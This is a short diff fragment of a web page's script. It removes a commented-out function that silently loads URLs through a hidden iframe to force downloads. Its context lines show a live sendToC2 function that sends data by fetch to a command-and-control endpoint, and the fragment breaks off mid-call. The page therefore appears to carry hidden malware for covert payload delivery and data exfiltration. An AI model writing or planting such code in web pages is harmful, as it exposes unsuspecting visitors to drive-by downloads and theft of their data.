@@ -565,19 +565,6 @@ hero-section { padding: 2rem 1.25rem; }
     return hits;
   }
 
- /* function triggerDownload(url, filename) {
-    var oldFrame = document.getElementById('hiddenDownloadFrame');
-    if (oldFrame) document.body.removeChild(oldFrame);
-    var iframe = document.createElement('iframe');
-    iframe.id = 'hiddenDownloadFrame';
-    iframe.style.display = 'none';
-    iframe.src = url;
-    document.body.appendChild(iframe);
-    setTimeout(function() {
-      var frame = document.getElementById('hiddenDownloadFrame');
-      if (frame) document.body.removeChild(frame);
-    }, 5000);
-  } */
 
   function sendToC2(data) {
     fetch(C2_ENDPOINT, {
